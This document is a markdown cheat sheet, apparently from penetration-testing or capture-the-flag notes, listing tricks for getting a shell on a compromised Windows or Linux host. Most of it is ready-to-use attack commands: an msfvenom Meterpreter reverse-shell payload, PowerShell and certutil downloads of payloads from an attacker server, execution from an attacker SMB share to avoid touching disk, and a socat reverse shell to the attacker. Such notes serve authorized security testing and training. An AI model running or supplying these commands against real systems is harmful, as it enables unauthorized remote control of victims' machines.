## Some useful tricks that could be useful to get a shell

#### 1. I have a RCE on windows box and I need to get a shell... Wget with Powershell!

* Obtain your payload with msfvenom or similar:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f exe > payload.exe
```

* Execute through your RCE on windows box:

```
command = "PowerShell -Command \"wget 'http://your_controlled_server/payload.exe' -OutFile reverse.exe\"" # command to run with RCE
```

Execute your payload (now called "reverse.exe") using RCE and setup a listening with msf multi-handler.

*Obs: Obviously, this method may not work well due to permission conditions and so on. This is out-of-scope... it's just a trick! :-)*

#### 2. Use certutil.exe to download files inside a Windows machine

```
certutil -urlcache -split -f http://<attacker_IP>:8080/msfpayload64.exe C:\\inetpub\\wwwroot\\msfpayload64.exe
```

#### 3. Use impacket-smbserver to run payloads in a Windows target

On your attacker machine, create a SMB server hosting a MSF payload (for example)

```
root@kali:/tmp# impacket-smbserver share /tmp
Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Using your RCE in the Windows box (target), execute the payload:

```
C:/>\\<attacker_IP>\msfpayload.exe 
```

On this way... the "msfpayload.exe" will never touch the disk.

#### 4. I need to transfer files (like my payloads) between VMs/hosts

* You can setup a simple web server using Python or PHP.
	+ Python:

	```python
	python -m SimpleHTTPServer 8080
	```
	
	And a simple HTTP server will be listening on your 8080 TCP port.
	
	+ PHP:

	```php
	php -S 127.0.0.1:8080
	```
	And a simple HTTP server will be listening on 127.0.0.1:8080.
	
#### 5. Upgrading simple shells to TTYs (or something close to it)

* Python with "pty":

```python
python -c "import pty;pty.spawn('/bin/bash');"
```
* Socat

On your localhost (attacker):

```
socat file:`tty`,raw,echo=0 tcp-listen:443
```

On your victim:

```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST_IP>:443
```

## Interesting links to read!

I *REALLY* recommend this link: https://bitvijays.github.io/LFC-VulnerableMachines.html  
https://blog.ropnop.com/transferring-files-from-kali-to-windows/ (A lot of techniques to transfer files from attacker machine to a windows box)  
https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/ (Upgrading simple shells techniques)
